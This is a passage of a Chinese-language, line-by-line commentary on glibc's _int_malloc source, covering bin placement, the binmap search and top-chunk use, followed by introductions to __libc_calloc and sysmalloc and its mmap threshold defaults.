\u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff alloc_perturb(p, bytes); return p; } \u521d\u59cb\u53d6\u51fa /* remove from unsorted list */ //\u4fee\u6539 unsortedchunk \u94fe\u8868 unsorted_chunks(av)->bk = bck; bck->fd = unsorted_chunks(av); \u53d6\u51fa chunk \u5927\u5c0f\u521a\u597d\u5408\u9002 \uff08EXACT FIT\uff09 \u5982\u679c\u4ece unsorted bin \u4e2d\u53d6\u51fa\u6765\u7684 chunk \u5927\u5c0f\u6b63\u597d\u5408\u9002\uff0c\u5c31\u76f4\u63a5\u4f7f\u7528\u3002\u8fd9\u91cc\u5e94\u8be5\u5df2\u7ecf\u628a\u5408\u5e76\u540e\u6070\u597d\u5408\u9002\u7684 chunk \u7ed9\u5206\u914d\u51fa\u53bb\u4e86\u3002 /* Take now instead of binning if exact fit */ if (size == nb) {//\u5927\u5c0f\u6b63\u597d\u5408\u9002 set_inuse_bit_at_offset(victim, size); // \u5982\u679c\u4e0d\u662f main_arena\uff0c\u8bbe\u7f6e\u5bf9\u5e94\u7684\u6807\u5fd7 if (av != &main_arena) set_non_main_arena(victim); // \u7ec6\u81f4\u7684\u68c0\u67e5\uff0c\u975e\u8c03\u8bd5\u72b6\u6001\u4e0b\u6ca1\u6709\u4f5c\u7528 check_malloced_chunk(av, victim, nb); // \u5c06 victim \u4ece chunk \u6a21\u5f0f\u8f6c\u5316\u4e3amem\u6a21\u5f0f void *p = chunk2mem(victim); // \u5982\u679c\u8bbe\u7f6e\u4e86perturb_type, \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff alloc_perturb(p, bytes); //\u76f4\u63a5\u8fd4\u56de chunk \u6307\u9488 return p; } \u5c06\u53d6\u51fa\u6765 chunk \u653e\u5165\u5230 smallbin \uff08PLACE CHUNK IN SMALL BIN\uff09 \u628a\u53d6\u51fa\u6765\u7684 chunk \u653e\u5230\u5bf9\u5e94\u7684 small bin \u4e2d\u3002 /* place chunk in bin */ //\u5224\u65ad size \u662f\u5426\u5728smallbin if (in_smallbin_range(size)) { // \u83b7\u53d6 small bin \u7684\u7d22\u5f15 victim_index = smallbin_index(size); // \u8c03\u6574 small bin \u7684\u94fe\u8868 bck = bin_at(av, victim_index); fwd = bck->fd; PLACE CHUNK IN LARGE BIN \u628a\u53d6\u51fa\u6765\u7684 chunk \u653e\u5230\u5bf9\u5e94\u7684 large bin \u4e2d\u3002 \u8fd9\u91cc\u5e94\u8be5\u662f\u83b7\u53d6\u6b63\u786e\u63d2\u5165\u4f4d\u7f6e\u7684\u6307\u9488 bck\u3001fwd\u3002\u6700\u540e\u63d2\u5165\u5f62\u5f0f\u4e3a\uff1abck<-->victim<-->fwd\u3002 \u94fe\u8868\u6784\u5efa\u5728\uff1a \u6700\u7ec8\u53d6\u51fa } else { // large bin \u8303\u56f4 victim_index = largebin_index(size); bck = bin_at(av, victim_index); // \u5f53\u524d large bin \u7684\u5934\u90e8 fwd = bck->fd; /* maintain large bins in sorted order */ /* \u4ece\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u603b\u7ed3\u51fa\uff0clargebin \u4ee5 fd_nextsize \u9012\u51cf\u6392\u5e8f\u3002 \u540c\u6837\u5927\u5c0f\u7684 chunk\uff0c\u540e\u6765\u7684\u53ea\u4f1a\u63d2\u5165\u5230\u4e4b\u524d\u540c\u6837\u5927\u5c0f\u7684 chunk \u540e\uff0c \u800c\u4e0d\u4f1a\u4fee\u6539\u4e4b\u524d\u76f8\u540c\u5927\u5c0f\u7684fd/bk_nextsize\uff0c\u8fd9\u4e5f\u5f88\u5bb9\u6613\u7406\u89e3\uff0c \u53ef\u4ee5\u51cf\u4f4e\u5f00\u9500\u3002\u6b64\u5916\uff0cbin \u5934\u4e0d\u53c2\u4e0e nextsize \u94fe\u63a5\u3002*/ // \u5982\u679c large bin \u94fe\u8868\u4e0d\u7a7a if (fwd != bck) { /* Or with inuse bit to speed comparisons */ // \u52a0\u901f\u6bd4\u8f83\uff0c\u5e94\u8be5\u4e0d\u4ec5\u4ec5\u6709\u8fd9\u4e2a\u8003\u8651\uff0c\u56e0\u4e3a\u94fe\u8868\u91cc\u7684 chunk \u90fd\u4f1a\u8bbe\u7f6e\u8be5\u4f4d\u3002 size |= PREV_INUSE; /* if smaller than smallest, bypass loop below */ // bck->bk \u5b58\u50a8\u7740\u76f8\u5e94 large bin \u4e2d\u6700\u5c0f\u7684chunk\u3002 // \u5982\u679c\u904d\u5386\u7684 chunk \u6bd4\u5f53\u524d\u6700\u5c0f\u7684\u8fd8\u8981\u5c0f\uff0c\u90a3\u5c31\u53ea\u9700\u8981\u63d2\u5165\u5230\u94fe\u8868\u5c3e\u90e8\u3002 // \u5224\u65ad bck->bk \u662f\u4e0d\u662f\u5728 main arena\u3002 assert(chunk_main_arena(bck->bk)); if ((unsigned long) (size) < (unsigned long) chunksize_nomask(bck->bk)) { // \u4ee4 fwd \u6307\u5411 large bin \u5934 fwd = bck; // \u4ee4 bck \u6307\u5411 largin bin \u5c3e\u90e8 chunk bck = bck->bk; // victim \u7684 fd_nextsize \u6307\u5411 largin bin \u7684\u7b2c\u4e00\u4e2a chunk victim->fd_nextsize = fwd->fd; // victim \u7684 bk_nextsize \u6307\u5411\u539f\u6765\u94fe\u8868\u7684\u7b2c\u4e00\u4e2a chunk \u6307\u5411\u7684 bk_nextsize victim->bk_nextsize = fwd->fd->bk_nextsize; // \u539f\u6765\u94fe\u8868\u7684\u7b2c\u4e00\u4e2a chunk \u7684 bk_nextsize \u6307\u5411 victim // \u539f\u6765\u6307\u5411\u94fe\u8868\u7b2c\u4e00\u4e2a chunk \u7684 fd_nextsize \u6307\u5411 victim fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim; } else { // \u5f53\u524d\u8981\u63d2\u5165\u7684 victim \u7684\u5927\u5c0f\u5927\u4e8e\u6700\u5c0f\u7684 chunk // \u5224\u65ad fwd \u662f\u5426\u5728 main arena assert(chunk_main_arena(fwd)); // \u4ece\u94fe\u8868\u5934\u90e8\u5f00\u59cb\u627e\u5230\u4e0d\u6bd4 victim \u5927\u7684 chunk while ((unsigned long) size < chunksize_nomask(fwd)) { fwd = fwd->fd_nextsize; assert(chunk_main_arena(fwd)); } // \u5982\u679c\u627e\u5230\u4e86\u4e00\u4e2a\u548c victim \u4e00\u6837\u5927\u7684 chunk\uff0c // \u90a3\u5c31\u76f4\u63a5\u5c06 chunk \u63d2\u5165\u5230\u8be5chunk\u7684\u540e\u9762\uff0c\u5e76\u4e0d\u4fee\u6539 nextsize \u6307\u9488\u3002 if ((unsigned long) size == (unsigned long) chunksize_nomask(fwd)) /* Always insert in the second position. */ fwd = fwd->fd; else { // \u5982\u679c\u627e\u5230\u7684chunk\u548c\u5f53\u524dvictim\u5927\u5c0f\u4e0d\u4e00\u6837 // \u90a3\u4e48\u5c31\u9700\u8981\u6784\u9020 nextsize \u53cc\u5411\u94fe\u8868\u4e86 victim->fd_nextsize = fwd; victim->bk_nextsize = fwd->bk_nextsize; fwd->bk_nextsize = victim; victim->bk_nextsize->fd_nextsize = victim; } bck = fwd->bk; } } else // \u5982\u679c\u7a7a\u7684\u8bdd\uff0c\u76f4\u63a5\u7b80\u5355\u4f7f\u5f97 fd_nextsize \u4e0e bk_nextsize \u6784\u6210\u4e00\u4e2a\u53cc\u5411\u94fe\u8868\u5373\u53ef\u3002 victim->fd_nextsize = victim->bk_nextsize = victim; } \u6700\u7ec8\u53d6\u51fa // \u653e\u5230\u5bf9\u5e94\u7684 bin \u4e2d\uff0c\u6784\u6210 bck<-->victim<-->fwd\u3002 mark_bin(av, victim_index); victim->bk = bck; victim->fd = fwd; fwd->bk = victim; bck->fd = victim; WHILE \u8fed\u4ee3\u6b21\u6570 while \u6700\u591a\u8fed\u4ee3 10000 \u6b21\u540e\u9000\u51fa\u3002 // #define MAX_ITERS 10000 if (++iters >= MAX_ITERS) break; } large chunk \u6ce8\uff1a \u6216\u8bb8\u4f1a\u5f88\u5947\u602a\uff0c\u4e3a\u4ec0\u4e48\u8fd9\u91cc\u6ca1\u6709\u5148\u53bb\u770b small chunk \u662f\u5426\u6ee1\u8db3\u65b0\u9700\u6c42\u4e86\u5462\uff1f\u8fd9\u662f\u56e0\u4e3a small bin \u5728\u5faa\u73af\u4e4b\u524d\u5df2\u7ecf\u5224\u65ad\u8fc7\u4e86\uff0c\u8fd9\u91cc\u5982\u679c\u6709\u7684\u8bdd\uff0c\u5c31\u662f\u5408\u5e76\u540e\u7684\u624d\u51fa\u73b0 chunk\u3002\u4f46\u662f\u5728\u5927\u5faa\u73af\u5916\uff0clarge chunk \u53ea\u662f\u5355\u7eaf\u5730\u627e\u5230\u5176\u7d22\u5f15\uff0c\u6240\u4ee5\u89c9\u5f97\u5728\u8fd9\u91cc\u76f4\u63a5\u5148\u5224\u65ad\u662f\u5408\u7406\u7684\uff0c\u800c\u4e14\u4e5f\u4e3a\u4e86\u4e0b\u9762\u53ef\u4ee5\u518d\u53bb\u627e\u8f83\u5927\u7684 chunk\u3002 \u5982\u679c\u8bf7\u6c42\u7684 chunk \u5728 large chunk \u8303\u56f4\u5185\uff0c\u5c31\u5728\u5bf9\u5e94\u7684 bin \u4e2d\u4ece\u5c0f\u5230\u5927\u8fdb\u884c\u626b\u63cf\uff0c\u627e\u5230\u7b2c\u4e00\u4e2a\u5408\u9002\u7684\u3002 /* If a large request, scan through the chunks of current bin in sorted order to find smallest that fits. Use the skip list for this. */ //\u5224\u65ad\u662f\u5426smallbin if (!in_smallbin_range(nb)) { bin = bin_at(av, idx); /* skip scan if empty or largest chunk is too small */ // \u5982\u679c\u5bf9\u5e94\u7684 bin \u4e3a\u7a7a\u6216\u8005\u5176\u4e2d\u7684chunk\u6700\u5927\u7684\u4e5f\u5f88\u5c0f\uff0c\u90a3\u5c31\u8df3\u8fc7 // first(bin)=bin->fd \u8868\u793a\u5f53\u524d\u94fe\u8868\u4e2d\u6700\u5927\u7684chunk if ((victim = first(bin)) != bin && (unsigned long) chunksize_nomask(victim) >= (unsigned long) (nb)) { // \u53cd\u5411\u904d\u5386\u94fe\u8868\uff0c\u76f4\u5230\u627e\u5230\u7b2c\u4e00\u4e2a\u4e0d\u5c0f\u4e8e\u6240\u9700chunk\u5927\u5c0f\u7684chunk victim = victim->bk_nextsize; while (((unsigned long) (size = chunksize(victim)) < (unsigned long) (nb))) victim = victim->bk_nextsize; /* Avoid removing the first entry for a size so that the skip list does not have to be rerouted. */ // \u5982\u679c\u6700\u7ec8\u53d6\u5230\u7684chunk\u4e0d\u662f\u8be5bin\u4e2d\u7684\u6700\u540e\u4e00\u4e2achunk\uff0c\u5e76\u4e14\u8be5chunk\u4e0e\u5176\u524d\u9762\u7684chunk // \u7684\u5927\u5c0f\u76f8\u540c\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53d6\u5176\u524d\u9762\u7684chunk\uff0c\u8fd9\u6837\u53ef\u4ee5\u907f\u514d\u8c03\u6574bk_nextsize,fd_nextsize // \u94fe\u8868\u3002\u56e0\u4e3a\u5927\u5c0f\u76f8\u540c\u7684chunk\u53ea\u6709\u4e00\u4e2a\u4f1a\u88ab\u4e32\u5728nextsize\u94fe\u4e0a\u3002 if (victim != last(bin) && chunksize_nomask(victim) == chunksize_nomask(victim->fd)) victim = victim->fd; // \u8ba1\u7b97\u5206\u914d\u540e\u5269\u4f59\u7684\u5927\u5c0f remainder_size = size - nb; // \u8fdb\u884cunlink\uff08\u5b8f\u64cd\u4f5c\uff09 unlink(av, victim, bck, fwd); /* Exhaust */ // \u5269\u4e0b\u7684\u5927\u5c0f\u4e0d\u8db3\u4ee5\u5f53\u505a\u4e00\u4e2a\u5757 // \u5f88\u597d\u5947\u63a5\u4e0b\u6765\u4f1a\u600e\u4e48\u529e\uff1f if (remainder_size < MINSIZE) { set_inuse_bit_at_offset(victim, size); if (av != &main_arena) set_non_main_arena(victim); } /* Split */ // \u5269\u4e0b\u7684\u5927\u5c0f\u8fd8\u53ef\u4ee5\u4f5c\u4e3a\u4e00\u4e2achunk\uff0c\u8fdb\u884c\u5206\u5272\u3002 else { // \u83b7\u53d6\u5269\u4e0b\u90a3\u90e8\u5206chunk\u7684\u6307\u9488\uff0c\u79f0\u4e3aremainder remainder = chunk_at_offset(victim, nb); /* We cannot assume the unsorted list is empty and therefore have to perform a complete insert here. */ // \u63d2\u5165unsorted bin\u4e2d bck = unsorted_chunks(av); fwd = bck->fd; // \u5224\u65ad unsorted bin \u662f\u5426\u88ab\u7834\u574f\u3002 if (__glibc_unlikely(fwd->bk != bck)) { errstr = \"malloc(): corrupted unsorted chunks\"; goto errout; } remainder->bk = bck; remainder->fd = fwd; bck->fd = remainder; fwd->bk = remainder; // \u5982\u679c\u4e0d\u5904\u4e8esmall bin\u8303\u56f4\u5185\uff0c\u5c31\u8bbe\u7f6e\u5bf9\u5e94\u7684\u5b57\u6bb5 if (!in_smallbin_range(remainder_size)) { remainder->fd_nextsize = NULL; remainder->bk_nextsize = NULL; } // \u8bbe\u7f6e\u5206\u914d\u7684chunk\u7684\u6807\u8bb0 set_head(victim, nb | PREV_INUSE | (av != &main_arena ? NON_MAIN_ARENA : 0)); // \u8bbe\u7f6eremainder\u7684\u4e0a\u4e00\u4e2achunk\uff0c\u5373\u5206\u914d\u51fa\u53bb\u7684chunk\u7684\u4f7f\u7528\u72b6\u6001 // \u5176\u4f59\u7684\u4e0d\u7528\u7ba1\uff0c\u76f4\u63a5\u4ece\u4e0a\u9762\u7ee7\u627f\u4e0b\u6765\u4e86 set_head(remainder, remainder_size | PREV_INUSE); // \u8bbe\u7f6eremainder\u7684\u5927\u5c0f set_foot(remainder, remainder_size); } // \u68c0\u67e5 check_malloced_chunk(av, victim, nb); // \u8f6c\u6362\u4e3amem\u72b6\u6001 void *p = chunk2mem(victim); // \u5982\u679c\u8bbe\u7f6e\u4e86perturb_type, \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff alloc_perturb(p, bytes); return p; } } \u5bfb\u627e\u8f83\u5927 chunk \u5982\u679c\u8d70\u5230\u4e86\u8fd9\u91cc\uff0c\u90a3\u8bf4\u660e\u5bf9\u4e8e\u7528\u6237\u6240\u9700\u7684 chunk\uff0c\u4e0d\u80fd\u76f4\u63a5\u4ece\u5176\u5bf9\u5e94\u7684\u5408\u9002\u7684 bin \u4e2d\u83b7\u53d6 chunk [^1]\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u6765\u67e5\u627e\u6bd4\u5f53\u524d bin \u66f4\u5927\u7684 fast bin \uff0c small bin \u6216\u8005 large bin\u3002 [^1]:\u8fd9\u91cc\u610f\u601d\u662f\u53bb\u5bf9\u5e94 bin \u53d6\uff0c\u6ca1\u6709\u529e\u6cd5\u53d6\u5230\u3002\u6bd4\u5982\u9700\u8981\u4e00\u4e2a 0x100 \u7684chunk \uff0c\u53bb\u5230\u5927\u5c0f\u4e3a 0x100 \u7684bin \u4e2d\u53d6\uff0c\u800c\u8be5 bin \u4e2d\u6ca1\u6709\u7a7a\u95f2 chunk \u3002 /* Search for a chunk by scanning bins, starting with next largest bin. This search is strictly by best-fit; i.e., the smallest (with ties going to approximately the least recently used) chunk that fits is selected. The bitmap avoids needing to check that most blocks are nonempty. The particular case of skipping all bins during warm-up phases when no chunks have been returned yet is faster than it might look. */ ++idx; // \u83b7\u53d6\u5bf9\u5e94\u7684bin bin = bin_at(av, idx); // \u83b7\u53d6\u5f53\u524d\u7d22\u5f15\u5728binmap\u4e2d\u7684block\u7d22\u5f15 // #define idx2block(i) ((i) >> BINMAPSHIFT) ,BINMAPSHIFT=5 // Binmap\u6309block\u7ba1\u7406\uff0c\u6bcf\u4e2ablock\u4e3a\u4e00\u4e2aint\uff0c\u517132\u4e2abit\uff0c\u53ef\u4ee5\u8868\u793a32\u4e2abin\u4e2d\u662f\u5426\u6709\u7a7a\u95f2chunk\u5b58\u5728 // \u6240\u4ee5\u8fd9\u91cc\u662f\u53f3\u79fb5 block = idx2block(idx); // \u83b7\u53d6\u5f53\u524d\u5757\u5927\u5c0f\u5bf9\u5e94\u7684\u6620\u5c04\uff0c\u8fd9\u91cc\u53ef\u4ee5\u5f97\u77e5\u76f8\u5e94\u7684bin\u4e2d\u662f\u5426\u6709\u7a7a\u95f2\u5757 map = av->binmap[ block ]; // #define idx2bit(i) ((1U << ((i) & ((1U << BINMAPSHIFT) - 1)))) // \u5c06idx\u5bf9\u5e94\u7684\u6bd4\u7279\u4f4d\u8bbe\u7f6e\u4e3a1\uff0c\u5176\u5b83\u4f4d\u4e3a0 bit = idx2bit(idx); for (;;) { \u627e\u5230\u4e00\u4e2a\u5408\u9002\u7684 MAP /* Skip rest of block if there are no more set bits in this block. */ // \u5982\u679cbit>map\uff0c\u5219\u8868\u793a\u8be5 map \u4e2d\u6ca1\u6709\u6bd4\u5f53\u524d\u6240\u9700\u8981chunk\u5927\u7684\u7a7a\u95f2\u5757 // \u5982\u679cbit\u4e3a0\uff0c\u90a3\u4e48\u8bf4\u660e\uff0c\u4e0a\u9762idx2bit\u5e26\u5165\u7684\u53c2\u6570\u4e3a0\u3002 if (bit > map || bit == 0) { do { // \u5bfb\u627e\u4e0b\u4e00\u4e2ablock\uff0c\u76f4\u5230\u5176\u5bf9\u5e94\u7684map\u4e0d\u4e3a0\u3002 // \u5982\u679c\u5df2\u7ecf\u4e0d\u5b58\u5728\u7684\u8bdd\uff0c\u90a3\u5c31\u53ea\u80fd\u4f7f\u7528top chunk\u4e86 if (++block >= BINMAPSIZE) /* out of bins */ goto use_top; } while ((map = av->binmap[ block ]) == 0); // \u83b7\u53d6\u5176\u5bf9\u5e94\u7684bin\uff0c\u56e0\u4e3a\u8be5map\u4e2d\u7684chunk\u5927\u5c0f\u90fd\u6bd4\u6240\u9700\u7684chunk\u5927\uff0c\u800c\u4e14 // map\u672c\u8eab\u4e0d\u4e3a0\uff0c\u6240\u4ee5\u5fc5\u7136\u5b58\u5728\u6ee1\u8db3\u9700\u6c42\u7684chunk\u3002 bin = bin_at(av, (block << BINMAPSHIFT)); bit = 1; } \u627e\u5230\u5408\u9002\u7684 BIN /* Advance to bin with set bit. There must be one. */ // \u4ece\u5f53\u524dmap\u7684\u6700\u5c0f\u7684bin\u4e00\u76f4\u627e\uff0c\u76f4\u5230\u627e\u5230\u5408\u9002\u7684bin\u3002 // \u8fd9\u91cc\u662f\u4e00\u5b9a\u5b58\u5728\u7684 while ((bit & map) == 0) { bin = next_bin(bin); bit <<= 1; assert(bit != 0); } \u7b80\u5355\u68c0\u67e5 CHUNK /* Inspect the bin. It is likely to be non-empty */ // \u83b7\u53d6\u5bf9\u5e94\u7684bin victim = last(bin); /* If a false alarm (empty bin), clear the bit. */ // \u5982\u679cvictim=bin\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u5c06map\u5bf9\u5e94\u7684\u4f4d\u6e050\uff0c\u7136\u540e\u83b7\u53d6\u4e0b\u4e00\u4e2abin // \u8fd9\u79cd\u60c5\u51b5\u53d1\u751f\u7684\u6982\u7387\u5e94\u8be5\u5f88\u5c0f\u3002 if (victim == bin) { av->binmap[ block ] = map &= ~bit; /* Write through */ bin = next_bin(bin); bit <<= 1; } \u771f\u6b63\u53d6\u51fa CHUNK else { // \u83b7\u53d6\u5bf9\u5e94victim\u7684\u5927\u5c0f size = chunksize(victim); /* We know the first chunk in this bin is big enough to use. */ assert((unsigned long) (size) >= (unsigned long) (nb)); // \u8ba1\u7b97\u5206\u5272\u540e\u5269\u4f59\u7684\u5927\u5c0f remainder_size = size - nb; /* unlink */ unlink(av, victim, bck, fwd); /* Exhaust */ // \u5982\u679c\u5206\u5272\u540e\u4e0d\u591f\u4e00\u4e2achunk\u600e\u4e48\u529e\uff1f if (remainder_size < MINSIZE) { set_inuse_bit_at_offset(victim, size); if (av != &main_arena) set_non_main_arena(victim); } /* Split */ // \u5982\u679c\u591f\uff0c\u5c3d\u7ba1\u5206\u5272 else { // \u8ba1\u7b97\u5269\u4f59\u7684chunk\u7684\u504f\u79fb remainder = chunk_at_offset(victim, nb); /* We cannot assume the unsorted list is empty and therefore have to perform a complete insert here. */ // \u5c06\u5269\u4f59\u7684chunk\u63d2\u5165\u5230unsorted bin\u4e2d bck = unsorted_chunks(av); fwd = bck->fd; if (__glibc_unlikely(fwd->bk != bck)) { errstr = \"malloc(): corrupted unsorted chunks 2\"; goto errout; } remainder->bk = bck; remainder->fd = fwd; bck->fd = remainder; fwd->bk = remainder; /* advertise as last remainder */ // \u5982\u679c\u5728small bin\u8303\u56f4\u5185\uff0c\u5c31\u5c06\u5176\u6807\u8bb0\u4e3aremainder if (in_smallbin_range(nb)) av->last_remainder = remainder; if (!in_smallbin_range(remainder_size)) { remainder->fd_nextsize = NULL; remainder->bk_nextsize = NULL; } // \u8bbe\u7f6evictim\u7684\u4f7f\u7528\u72b6\u6001 set_head(victim, nb | PREV_INUSE | (av != &main_arena ? NON_MAIN_ARENA : 0)); // \u8bbe\u7f6eremainder\u7684\u4f7f\u7528\u72b6\u6001\uff0c\u8fd9\u91cc\u662f\u4e3a\u4ec0\u4e48\u5462\uff1f set_head(remainder, remainder_size | PREV_INUSE); // \u8bbe\u7f6eremainder\u7684\u5927\u5c0f set_foot(remainder, remainder_size); } // \u68c0\u67e5 check_malloced_chunk(av, victim, nb); // chunk\u72b6\u6001\u8f6c\u6362\u5230mem\u72b6\u6001 void *p = chunk2mem(victim); // \u5982\u679c\u8bbe\u7f6e\u4e86perturb_type, \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff alloc_perturb(p, bytes); return p; } \u4f7f\u7528 top chunk \u5982\u679c\u6240\u6709\u7684 bin \u4e2d\u7684 chunk \u90fd\u6ca1\u6709\u529e\u6cd5\u76f4\u63a5\u6ee1\u8db3\u8981\u6c42\uff08\u5373\u4e0d\u5408\u5e76\uff09\uff0c\u6216\u8005\u8bf4\u90fd\u6ca1\u6709\u7a7a\u95f2\u7684 chunk\u3002 \u90a3\u4e48\u6211\u4eec\u5c31\u53ea\u80fd\u4f7f\u7528 top chunk \u4e86\u3002 use_top: /* If large enough, split off the chunk bordering the end of memory (held in av->top). Note that this is in accord with the best-fit search rule. In effect, av->top is treated as larger (and thus less well fitting) than any other available chunk since it can be extended to be as large as necessary (up to system limitations). We require that av->top always exists (i.e., has size >= MINSIZE) after initialization, so if it would otherwise be exhausted by current request, it is replenished. (The main reason for ensuring it exists is that we may need MINSIZE space to put in fenceposts in sysmalloc.) */ // \u83b7\u53d6\u5f53\u524d\u7684top chunk\uff0c\u5e76\u8ba1\u7b97\u5176\u5bf9\u5e94\u7684\u5927\u5c0f victim = av->top; size = chunksize(victim); // \u5982\u679c\u5206\u5272\u4e4b\u540e\uff0ctop chunk \u5927\u5c0f\u4ecd\u7136\u6ee1\u8db3 chunk \u7684\u6700\u5c0f\u5927\u5c0f\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c\u5206\u5272\u3002 if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE)) { remainder_size = size - nb; remainder = chunk_at_offset(victim, nb); av->top = remainder; // \u8fd9\u91cc\u8bbe\u7f6e PREV_INUSE \u662f\u56e0\u4e3a top chunk \u524d\u9762\u7684 chunk \u5982\u679c\u4e0d\u662f fastbin\uff0c\u5c31\u5fc5\u7136\u4f1a\u548c // top chunk \u5408\u5e76\uff0c\u6240\u4ee5\u8fd9\u91cc\u8bbe\u7f6e\u4e86 PREV_INUSE\u3002 set_head(victim, nb | PREV_INUSE | (av != &main_arena ? NON_MAIN_ARENA : 0)); set_head(remainder, remainder_size | PREV_INUSE); check_malloced_chunk(av, victim, nb); void *p = chunk2mem(victim); alloc_perturb(p, bytes); return p; } // \u5426\u5219\uff0c\u5224\u65ad\u662f\u5426\u6709 fast chunk /* When we are using atomic ops to free fast chunks we can get here for all block sizes. */ else if (have_fastchunks(av)) { // \u5148\u6267\u884c\u4e00\u6b21fast bin\u7684\u5408\u5e76 malloc_consolidate(av); /* restore original bin index */ // \u5224\u65ad\u9700\u8981\u7684chunk\u662f\u5728small bin\u8303\u56f4\u5185\u8fd8\u662flarge bin\u8303\u56f4\u5185 // \u5e76\u8ba1\u7b97\u5bf9\u5e94\u7684\u7d22\u5f15 // \u7b49\u5f85\u4e0b\u6b21\u518d\u770b\u770b\u662f\u5426\u53ef\u4ee5 if (in_smallbin_range(nb)) idx = smallbin_index(nb); else idx = largebin_index(nb); } \u5806\u5185\u5b58\u4e0d\u591f \u5982\u679c\u5806\u5185\u5b58\u4e0d\u591f\uff0c\u6211\u4eec\u5c31\u9700\u8981\u4f7f\u7528 sysmalloc \u6765\u7533\u8bf7\u5185\u5b58\u4e86\u3002 /* Otherwise, relay to handle system-dependent cases */ // \u5426\u5219\u7684\u8bdd\uff0c\u6211\u4eec\u5c31\u53ea\u80fd\u4ece\u7cfb\u7edf\u4e2d\u518d\u6b21\u7533\u8bf7\u4e00\u70b9\u5185\u5b58\u4e86\u3002 else { void *p = sysmalloc(nb, av); if (p != NULL) alloc_perturb(p, bytes); return p; } _libc_calloc calloc \u4e5f\u662f libc \u4e2d\u7684\u4e00\u79cd\u7533\u8bf7\u5185\u5b58\u5757\u7684\u51fd\u6570\u3002\u5728 libc \u4e2d\u7684\u5c01\u88c5\u4e3a _libc_calloc \uff0c\u5177\u4f53\u4ecb\u7ecd\u5982\u4e0b /* calloc(size_t n_elements, size_t element_size); Returns a pointer to n_elements * element_size bytes, with all locations set to zero. */ void* __libc_calloc(size_t, size_t); 2020.07.08 \u4e0b\u9762\u5927\u6982\u6d4f\u89c8\u4e00\u4e0b\u672a\u4ed4\u7ec6\u54c1\u5473 sysmalloc \u6b63\u5982\u8be5\u51fd\u6570\u5934\u7684\u6ce8\u91ca\u6240\u8a00\uff0c\u8be5\u51fd\u6570\u7528\u4e8e\u5f53\u524d\u5806\u5185\u5b58\u4e0d\u8db3\u65f6\uff0c\u9700\u8981\u5411\u7cfb\u7edf\u7533\u8bf7\u66f4\u591a\u7684\u5185\u5b58\u3002 /* sysmalloc handles malloc cases requiring more memory from the system. On entry, it is assumed that av->top does not have enough space to service request for nb bytes, thus requiring that av->top be extended or replaced. */ \u57fa\u672c\u5b9a\u4e49 static void *sysmalloc(INTERNAL_SIZE_T nb, mstate av) { mchunkptr old_top; /* incoming value of av->top */ INTERNAL_SIZE_T old_size; /* its size */ char *old_end; /* its end address */ long size; /* arg to first MORECORE or mmap call */ char *brk; /* return value from MORECORE */ long correction; /* arg to 2nd MORECORE call */ char *snd_brk; /* 2nd return val */ INTERNAL_SIZE_T front_misalign; /* unusable bytes at front of new space */ INTERNAL_SIZE_T end_misalign; /* partial page left at end of new space */ char *aligned_brk; /* aligned offset into brk */ mchunkptr p; /* the allocated/returned chunk */ mchunkptr remainder; /* remainder frOm allocation */ unsigned long remainder_size; /* its size */ size_t pagesize = GLRO(dl_pagesize); bool tried_mmap = false; \u6211\u4eec\u53ef\u4ee5\u4e3b\u8981\u5173\u6ce8\u4e00\u4e0b pagesize \uff0c\u5176 #ifndef EXEC_PAGESIZE #define EXEC_PAGESIZE 4096 #endif # define GLRO(name) _##name size_t _dl_pagesize = EXEC_PAGESIZE; \u6240\u4ee5\uff0c pagesize=4096=0x1000 \u3002 \u8003\u8651 mmap \u6b63\u5982\u5f00\u5934\u6ce8\u91ca\u6240\u8a00\u5982\u679c\u6ee1\u8db3\u5982\u4e0b\u4efb\u4f55\u4e00\u79cd\u6761\u4ef6 \u6ca1\u6709\u5206\u914d\u5806\u3002 \u7533\u8bf7\u7684\u5185\u5b58\u5927\u4e8e mp_.mmap_threshold \uff0c\u5e76\u4e14 mmap \u7684\u6570\u91cf\u5c0f\u4e8e\u6700\u5927\u503c\uff0c\u5c31\u53ef\u4ee5\u5c1d\u8bd5\u4f7f\u7528 mmap\u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u4e34\u754c\u503c\u4e3a static struct malloc_par mp_ = { .top_pad = DEFAULT_TOP_PAD, .n_mmaps_max = DEFAULT_MMAP_MAX, .mmap_threshold = DEFAULT_MMAP_THRESHOLD, .trim_threshold = DEFAULT_TRIM_THRESHOLD, #define NARENAS_FROM_NCORES(n) ((n) * (sizeof(long) == 4 ? 2 : 8)) .arena_test = NARENAS_FROM_NCORES(1) #if USE_TCACHE , .tcache_count = TCACHE_FILL_COUNT, .tcache_bins = TCACHE_MAX_BINS, .tcache_max_bytes = tidx2usize(TCACHE_MAX_BINS - 1), .tcache_unsorted_limit = 0 /* No limit. */ #endif }; DEFAULT_MMAP_THRESHOLD \u4e3a 128*1024 \u5b57\u8282\uff0c\u5373 128 K\u3002 #ifndef DEFAULT_MMAP_THRESHOLD #define DEFAULT_MMAP_THRESHOLD DEFAULT_MMAP_THRESHOLD_MIN #endif /* MMAP_THRESHOLD_MAX and _MIN are the bounds on the dynamically adjusted MMAP_THRESHOLD. */ #ifndef DEFAULT_MMAP_THRESHOLD_MIN #define DEFAULT_MMAP_THRESHOLD_MIN (128 * 1024) #endif #ifndef DEFAULT_MMAP_THRESHOLD_MAX /* For 32-bit platforms we cannot increase the maximum mmap threshold much because it is also the minimum value for the maximum heap size and its alignment. Going above 512k (i.e., 1M for new heaps) wastes too much address space. */ #if __WORDSIZE == 32 #define DEFAULT_MMAP_THRESHOLD_MAX (512 * 1024) #else #define DEFAULT_MMAP_THRESHOLD_MAX (4 * 1024 * 1024 * sizeof(long)) 